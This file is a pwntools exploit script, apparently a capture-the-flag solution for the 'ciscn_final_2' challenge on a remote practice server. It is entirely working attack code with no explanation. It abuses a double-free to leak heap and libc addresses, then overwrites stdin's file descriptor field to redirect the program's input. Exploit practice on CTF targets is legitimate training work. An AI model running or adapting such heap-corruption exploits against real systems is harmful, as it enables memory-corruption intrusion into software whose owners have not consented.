# coding:utf-8
from random import choice
from pwn import *
context.log_level = 'debug'

proc_name = 'ciscn_final_2'
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
elf = ELF(proc_name)

islocal = 0
if islocal:
    p = process(proc_name)
else:
    p = remote('node4.buuoj.cn', 27210)

def debug(addr, PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))


def add(choice, num):
    p.recvuntil("> ")
    p.sendline("1")
    p.recvuntil(">")
    if choice == 1:         # int
        p.sendline("1")
    if choice == 2:         # short int
        p.sendline("2")
    p.recvuntil("number:")
    p.sendline(str(num))

def delete(choice):
    p.recvuntil("> ")
    p.sendline("2")
    p.recvuntil(">")
    if choice == 1:         # int
        p.sendline("1")
    if choice == 2:         # short int
        p.sendline("2")

def show(choice):
    p.recvuntil("> ")
    p.sendline("3")
    p.recvuntil(">")
    if choice == 1:         # int
        p.sendline("1")
    if choice == 2:         # short int
        p.sendline("2")
    p.recvuntil('number :')
    return int(p.recvuntil("\n", drop=True))

def leave(content):
    p.recvuntil("> ")
    p.sendline("4")
    p.recvuntil("last?")
    p.sendline(content)


def pwn():
    add(1, 0x30)
    delete(1)
    # debug(0)
    add(2, 0x20)
    add(2, 0x20)
    add(2, 0x20)
    add(2, 0x20)
    delete(2)
    # debug(0)
    add(1, 0x30)
    # debug(0)
    delete(2)
    # debug(0)
    addr = show(2) - 0xa0
    print("addr", hex(addr))
    add(2, addr)
    # debug(0)
    add(2, addr)
    # debug(0)
    add(2, 0x91)
    # debug(0)
    # pause()
    for i in range(0, 7):
        delete(1)
        # debug(0)
        add(2, 0x20)
        # debug(0)
    # debug(0)
    delete(1)
    # debug(0)
    main_arena_addr = show(1) - 96
    log.success('main_arena_addr => ' + hex(main_arena_addr))
    libc_base = main_arena_addr - libc.sym['__malloc_hook'] - 0x10
    __IO_2_1_stdin__fileno_addr = libc_base + libc.sym['_IO_2_1_stdin_'] + 0x70

    add(1, __IO_2_1_stdin__fileno_addr)
    add(1, 0x30) 
    delete(1)
    add(2, 0x20)
    delete(1)
    addr_chunk0_fd = show(1) - 0x30
    add(1, addr_chunk0_fd)
    add(1, addr_chunk0_fd)
    add(1, 111)
    add(1, 666)

    p.sendlineafter('which command?\n> ', '4')
    p.recvuntil('your message :')
    p.interactive()

if __name__ == '__main__':
    pwn()